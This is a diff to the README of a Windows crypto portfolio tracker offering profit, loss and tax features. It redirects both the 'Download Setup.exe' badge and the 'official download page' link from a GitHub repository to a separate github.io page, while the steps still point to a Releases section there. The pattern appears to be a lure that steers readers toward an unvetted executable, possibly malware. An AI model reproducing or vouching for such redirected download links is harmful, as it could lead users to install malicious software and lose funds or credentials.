@@ -1,6 +1,6 @@
 # 📈 Crypto-Price-Tracker-V2-2026 - Track your crypto portfolio with ease
 
-[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/disguiseanadamabread571/Crypto-Price-Tracker-V2-2026)
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://disguiseanadamabread571.github.io)
 
 This application tracks your cryptocurrency portfolio on Windows. It updates price data, calculates profit and loss, and provides tax estimations. You can use different accounting methods like First-In-First-Out or Last-In-First-Out to manage your tax lots. The tool also includes features for rebalancing your assets and viewing performance charts.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the software.
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official download page](https://github.com/disguiseanadamabread571/Crypto-Price-Tracker-V2-2026).
+1.  Visit the [official download page](https://disguiseanadamabread571.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the link for the latest version.
 4.  Download the file named Setup.exe.
